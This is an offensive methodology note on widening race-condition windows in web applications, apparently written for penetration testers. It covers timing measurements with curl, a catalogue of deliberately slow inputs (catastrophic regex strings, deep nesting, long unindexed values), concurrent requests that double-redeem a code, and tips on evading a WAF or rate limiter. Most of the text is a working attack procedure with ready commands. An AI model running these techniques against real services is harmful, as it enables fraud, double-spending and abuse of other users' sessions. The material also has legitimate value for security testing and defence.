# Timing oracle — measuring and widening the window without racing

The PhantomFeed technique and its generalization: when the race is hard to
land, measure and inflate the window first.

---

## 1. The idea

A race needs the second request inside the window. If the window is too narrow
to hit by delivery alone, *widen* it — give the check more work to do so the
read→commit gap grows. The widening input is the primitive; the timing delta
between a normal and a pathological input is the signal that one exists.

## 2. The measurement pass

```bash
# time a normal input — the baseline check duration
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{time_total}\n' -X POST "$BASE/api/profile" \
    -d '{"email":"a@b.co"}' -H "Cookie: $SESSION"
done

# time a pathological input — if it's slower, the check is doing more work
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{time_total}\n' -X POST "$BASE/api/profile" \
    -d '{"email":"a@abcdefghijklmnopqrstuvwxyz!"}' -H "Cookie: $SESSION"
done
```

A consistent ms-scale delta between arms means the check itself is slow — the
window is wide enough to land in without exotic timing.

## 3. The pathological-input families

| Family | The input | What it slows |
|---|---|---|
| catastrophic regex | `a@` + 26+ chars + `!` | backtracking validation — quadratic+ |
| long uniqueness field | `name` + 500 chars on an unindexed column | a full-table-scan uniqueness check |
| deep nesting | `{"a":{"a":{"a":...}}}` | a recursive deserializer/serializer |
| bcrypt-length | a password at the length boundary | a slow KDF on attacker-influenced length |
| a big query | a value that forces a join/scan | the uniqueness/validity lookup |
| a many-element array | `[1,2,3,...1000]` | a per-element validator |
| a wide unicode | multibyte/combining chars | a normalization/escape pass |

## 4. The window-widening loop

```text
1. find a field the check touches (a validator input, a uniqueness field)
2. try the pathological families — measure the time delta
3. the arm that's measurably slower → a widening primitive exists
4. fire the race with the pathological input in the *first* request's field
   → A's check is slow → B lands inside the widened window
```

## 5. Which fields widen which check

| The check | The field | The widen |
|---|---|---|
| regex validation | the validated field | a catastrophic input |
| uniqueness lookup | the unique field | a long/unindexed value |
| a foreign-key check | the referenced id | a value forcing a join |
| a format/parse check | the parsed field | a deeply-nested or huge value |
| a permission/ACL check | the checked resource | a value that forces a second lookup |

## 6. The PhantomFeed shape, concretely

```text
the check: a regex on `email` that backtracks on `a@` + many-chars + `!`
normal:    email=a@b.co        → ~20ms
pathol:    email=a@<26chars>!  → ~200ms
the race:  A with pathological email → A's check is 180ms slower →
           B (a second profile update) lands inside A's window →
           the token-cross wins where a normal input's window was too narrow
```

The widen is *in the same field the endpoint validates* — you're not slowing
the whole app, you're slowing the specific check whose window you need.

## 7. Measuring the window width directly

```bash
# the read→commit latency — proxy for window width
# send a request, immediately a second; the second's "already done" latency
# tells you how long the window stayed open
time curl -s -X POST "$BASE/api/redeem" -d '{"code":"XYZ"}' -b "$SESSION" &
time curl -s -X POST "$BASE/api/redeem" -d '{"code":"XYZ"}' -b "$SESSION" &
wait
# the second's 409 latency ≈ how long the first's commit took = window width
```

## 8. The oracle → race decision

| Timing result | Route |
|---|---|
| normal ≈ pathological (no delta) | no easy widen — the window is the natural gap |
| pathological measurably slower | a widen exists — fire the race with it in the first request |
| the widen is huge (>100ms) | a burst will land — no interleave needed |
| the widen is small (5-20ms) | an interleave/stall still needed |

## 9. The limits

- A pathological input that *breaks* the request (a `413`/`400`/crash) doesn't
  widen — it fails early. The input must be *valid but slow*.
- A WAF/rate-limiter may reject the pathological shape — race the limiter or
  find a field it doesn't inspect.
- The widen helps the *first* request's window — put the pathological input in
  the request whose commit you want to delay, not the racing one.
